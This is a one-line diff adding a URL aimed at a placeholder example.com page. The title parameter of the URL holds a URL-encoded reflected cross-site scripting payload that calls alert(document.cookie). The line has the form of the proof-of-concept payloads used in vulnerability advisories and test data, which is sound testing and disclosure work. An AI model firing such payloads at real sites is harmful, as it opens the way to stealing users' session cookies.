@@ -1,0 +1,1 @@
+http://www.example.com/publisher/moreinfo.asp?bookid=2&amp;title=%3Cscript%3Ealert(document.cookie)%3C/script%3E
